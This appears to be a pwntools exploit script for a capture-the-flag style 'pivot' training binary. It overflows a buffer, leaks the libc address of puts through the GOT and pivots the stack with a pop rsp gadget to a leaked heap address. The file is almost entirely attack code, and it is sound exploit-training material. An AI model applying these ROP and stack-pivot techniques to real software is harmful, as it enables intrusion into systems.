from pwn import *

context(arch='amd64', os='linux')
binary_name = 'pivot'
p = process('./'+binary_name)
elf =  ELF(binary_name)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop =  ROP(elf)

# 0x0000000000400b6d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rsp_r13_r14_r15 = 0x400b6d

received = p.recvuntil("> ")
print received
pivot_address = received.split("pivot: ")[1].split("\n")[0]
pivot_address_hexa = int(pivot_address, 16)
log.info("Pivot address:         "+  str(pivot_address))

foothold_function_PLT = elf.plt["foothold_function"]
foothold_function_GOT = elf.got["foothold_function"]
log.info("foothold_function plt: " + hex(foothold_function_PLT))
log.info("foothold_function GOT: " + hex(foothold_function_GOT))

# ret2win_PLT = elf.plt["ret2win"]
# ret2win_GOT = elf.got["ret2win"]
# log.info("ret2win plt: " + hex(foothold_function_PLT))
# log.info("ret2win GOT: " + hex(foothold_function_GOT))

MAIN_PLT = elf.symbols['main']
PUTS_PLT = elf.plt['puts']
puts_GOT = elf.got["puts"]
log.info("Main start:            " + hex(MAIN_PLT))
log.info("Puts plt:              " + hex(PUTS_PLT))
log.info("puts GOT:              " + hex(puts_GOT))

pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
log.info("pop rdi; ret:          " + hex(pop_rdi))


rop1 = p64(foothold_function_GOT) + p64(pop_rdi) + p64(puts_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
#rop1 = "A" * 40
#rop1 = p64(pop_rdi) + p64(foothold_function_GOT) + p64(foothold_function_PLT) + p64(MAIN_PLT)
p.sendline(rop1)
recieved = p.recvline().strip()
print "-received-"
print recieved
leak = u64(recieved.ljust(8, "\x00"))
print "-leak-"
print leak

# Stack pivot
chain2 = "A" * 40 + p64(pop_rsp_r13_r14_r15) + 4* (p64(pivot_address_hexa))
p.sendline(chain2)

p.interactive()